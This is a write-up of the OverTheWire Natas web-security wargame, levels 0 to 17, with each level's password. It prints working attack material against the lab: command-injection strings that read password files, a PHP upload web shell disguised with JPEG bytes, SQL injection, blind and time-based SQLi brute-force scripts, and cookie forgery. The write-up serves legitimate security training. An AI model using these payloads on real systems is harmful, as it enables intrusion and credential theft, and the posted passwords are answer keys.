# NATAS LEVEL WRITEUPS

* You can access those level here: http://overthewire.org/wargames/natas/
* All usernames are: natasXX[^1]
* Remember that all password are stored in /etc/natas_webpass/natasXX[^1]
* We will use Firefox and Python 
[^1]: XX is the current level

Note: Password may change, but the way to get them should be right.


### Level 0

Open the Page Inspector (right-click anywhere in the page and then Inspect Element) 
you'll find the password as a comment: 

> <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->


### Level 1

It's the same as level 0 but you can't right-click so you have to find another way to open inspecto.
You can do it in two ways:

* Tools -> Web Developer -> Inspector 
* Ctrl + Shift + C

Again you'll find the password in the comment:

> <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


### Level 2

When you don't know what to do, open the Inspector and see what it has to show.
Now we see that there's an image in some folder, we also see that the image is useless but we can see if the folder contains something else.

You can open the folder by just adding the name to the URL's like this:
http://natas2.natas.labs.overthewire.org/files

Oh look! In the folder there's also a user.txt files, let's what it has written inside.

> Here's your password for the next level: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


### Level 3

For this level we need some knowledge of how websites works, you shold know what a robots.txt file is, if you don't then google it and come back.

Now that we know what a robots.txt file is we can access it and continue
http://natas3.natas.labs.overthewire.org/robots.txt
We can see that we have a s3cr3t folder, go into it and look what it keeps from us
Oh, another user.txt.

> Here's your password for the next level: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ


### Level 4

For this level we will use "tamper data" and play with some packets.[^2]
[^2] I suggest to open tamper data with only the natas page open, otherwise he will ask what to do for every page you have open and this can be annoying.

Now that you have installed it, open it and click the link "Refresh Page"
Tamper data will ask you what you want to do and you'll click on tamper, a form will come up and what you have to do is change the field of "refer" from natas4 to natas5 and then click OK
Now you have the permission to see the page, and you will see the password

>  Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 


### Level 5

For this level we will use "Cookie Manager", but you can use whatever you want that let you play with cookie.

Now click the icon and then the field "Search natas/blablabla"
You will see one cookie for natas5, click on "Edit" and change the field of "Content" from 0 to 1.
Done!

>  Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1


### Level 6

For this level we will have to find some secret input to validate and get the password for next level.
As we see the source code we can find a PHP script, an we read an interesting 
```php
include "includes/secret.inc";
```
So let's go to that path and see what we can find.
We obviously find a blank page, but our best friend, Mr. Inspector, will help us as always.

Here's your secret, now feed it to the textbox and you will have your password.

> Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 


### Level 7

In this level we see that they use php pages, always remember where password are stored (/etc/natas_webpass/natasXX).
If you inspect the page (and you always should), they also give you the hint of where they store password.
So if they tell us where they store password, it should mean that we will need that path.
We could try to put it as value of the variable `page` in the URL.

> Here's your password:  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 


### Level 8

Now things starts to get interesting.
We need some cryptography knowledge.

We see the function that encrypt our input and we know what we need as output, so we must do a bit of reverse of that function.

Here's the simple script that i've used:
```php
base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
```
This should give you `oubWYf2kBq` as output, so feed it to the textbox and you're good.

> Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl


### Level 9

In this level we need to play with a little script that works as a serch engine for a txt file.
We also need to know some basic unix basic command and how to concatenate them together in one line.
Try some words and see what it gives back.

Now, we know where password are stored so we will try some command injection
```shell
;cat /etc/natas_webpass/natas10
```
This should do the trick.

> Here's your password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu


### Level 10

I'll give you an hint, this level is like the previous one.

We need to do a command injection and make it print our password, but this time some character are forbidden, as you can see in the sourcecode page.
If you don't know how to concatenate unix command, open google and search for it.

```shell
...cat /etc/natas_webpass/natas11
```
Here's your solution.

> Here's your password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK


### Level 11
When we first see the level, it tell us everything, we need to decrypt something and work with cookie

In the textbox we can change the background color of the page, useless for now.

Open the cookie with whatever you want (I'll use cookie manager from firefox plugin), now take the content of the cookie we need to decode the `%3D` in something understandable, so we will use [hackvector.com](https://hackvertor.co.uk/public#) to decode from url encode.

Now we have the base64 version of the string `”showpassword”=>”no”, “bgcolor”=>”#ffffff”);`, so knowing a bit of cryptography se also know that with plaintext and ciphertext we can extrapolate the key:

```PHP
#!/usr/bin/php
 
<? 
    $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw'); 
    
    function xor_encrypt($in)
    { 
        $text = $in; 
        $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
        $outText = '';
     
        // Iterate through each character
     
        for($i=0;$i<strlen($text);$i++) 
        { 
            $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
        } 
        
        return $outText; 
    } 

    print xor_encrypt($cookie); 
?>
```

```
php natas_11.php

qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

Now that we have the key, we can create our custom cookie in the way that it will show us the password, and I've done it with this script:

```
#!/usr/bin/php

<? 
    function xor_encrypt($in)
    { 
        $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
        $key = "qw8J";
        $outText = '';

        // Iterate through each character

        for($i=0;$i<strlen($text);$i++) 
        { 
            $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
        } 
        return $outText; 
    } 
    
    print base64_encode(xor_encrypt()); 
?>
```
This is our new string:
```
php natas_11-2.php

ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Now put it in the cookie and you'll get the password

> The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3


### Level 12

This level is pretty interesting, and a bit tricky because we need to use BurpSuite to intercept our request, but we'll talk about that later.

As we first open the page we see that we can upload a file, and when we see the source code we also see that our uploaded file will have a random string as name with the .jpg format.

So we first have to craft out file, like this:

```PHP
#!/usr/bin/php

<? readfile('/etc/natas_webpass/natas13'); ?>
```
Here is where BurpSuite come in our help (I won't explain how to use it, but is preatty simple and you can learn this thing with a 10 minutes on google)

What we have to do with BurpSuite is change the extension of our uploaded file so we can run it.

```
The file upload/lrn0t7ehgm.php has been uploaded
```

Now we just have to open the file and we'll se the password:

> Here's your password for the next level: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY


### Level 13

This level is like the previous one, but this time they check the signature byte of the file.  

we'll use this python line of code to add what we need:
```python
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
```

Now we upload the file and intercept the request with BurpSuite like the previous level, and remove the strange character at the beginning of the file

```
The file upload/<name>.php has been uploaded
```
Now we open the file and we'll get the password:


> Here's your password for the next level: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

### Level 14

As we open the level we see a login form.  
We'll take a look at the source code as always and we will notice that they do some query to a SQL database.  

Obviously we'll need to do some SQLi to exploit this level.  

After running some test, i've found that `"` is unchecked. Easy then.  
We put the awesome `test"OR "1"="1` in both input and we logon.  

> Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


### Level 15

As we logon we see an input box and a button, they say that we can check if an user exist.

For this level we'll use a python script and a tecnique called *bruteforce*  

Here's the script:

```python
import requests

auth_header = {'Authorization':'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def make_url(substr):
        return "http://natas15.natas.labs.overthewire.org/index.php?debug=true&username=natas16%22%20and%20BINARY%20SUBSTRING%28password,1,%22" + str(len(substr)) + "%22%29=%22" + substr + "%22%20and%20%22a%22=%22a"

def is_success(url):
    resp = requests.get(make_url(url), headers=auth_header)
    return "This user exists." in resp.text

password = ""

while len(password) < 32:
    for char in alphanumerics:
        print password+char
        if is_success(password+char):
            password += char
            break

    print "Password =", password
```

Let the script run and at the end you'll get the password:

> Password = WaIHEacj63wnNIBROHeqi3p9t0m5nhmh


### Level 16

For this level we'll use the same tools as the one before: python and bruteforce.  
But this time we'll bruteforce the parameter we give to the `grep`, checking for `hello` as answer.  

Here's the script:

```python
import requests

auth_header = {'Authorization':'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def make_url(string):
    return "http://natas16.natas.labs.overthewire.org/index.php?needle=hello$(grep -n " + string + " /etc/natas_webpass/natas17)"
def is_correct(string):
    print make_url(string)
    resp = requests.get(make_url(string), headers=auth_header).text
    return "hello" not in resp
# make a list of all possible characters
print "making a list of all characters in pw file..."
possible_chars = []
for char in alphanumerics:
    if is_correct(char):
        print char
        possible_chars.append(char)
# print out all possible characters
print possible_chars
# try to find the full password by appending possible characters to either end of the password we have so far
password = ""
while len(password) < 32:
    print "Password =", password
    for char in possible_chars:
        if is_correct(password + char): password = password + char
        if is_correct(char + password): password = char + password


print password
print "Woohoo!"
```

Let it run for a bit and at the end you'll ahev the password:

> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw Woohoo!


### Level 17

This level will be a bit tricky.  
It is like level 15 so we'll use the same tecniques, but this time we will not see the output so we'll do a `blind` bruteforce, using the server responce time as indicator of the right choice of character.

Here's the script:

```python

#blind.py
import time
import requests
from requests.auth import HTTPBasicAuth
letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
solution = ""
for x in range(33):
    for c in letters:
        payload = {'username': 'natas18" and users.password COLLATE latin1_bin like "'+solution+c+'%'+'"and sleep(10) and "x"="x'}
        start = time.time()
        r = requests.post("http://natas17.natas.labs.overthewire.org/", data=payload, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        end = time.time()
        if int(end-start) >= 4:
            solution = solution + c
            print "Solution: " + solution
            break


print "Final: "+solution
```

I suggest you to run it without other application that use you connection, it is really sensible.

It also take a bit more time than other so i suggest you go and grab a coffee or whatelse.
When you return you should see this:

> Final: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP


### Level 18

TODO and cooming soon (but not so soon).
